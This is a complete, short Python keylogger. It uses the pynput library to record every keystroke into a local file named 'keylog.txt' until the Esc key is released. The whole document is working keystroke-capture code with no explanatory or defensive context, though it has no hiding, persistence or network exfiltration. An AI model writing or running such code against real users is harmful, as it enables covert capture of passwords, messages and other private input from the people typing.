from pynput import keyboard

def on_press(key):
    try:
        current_key = key.char
    except AttributeError:
        current_key = str(key)
    with open("keylog.txt", "a") as f:
        f.write(current_key)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
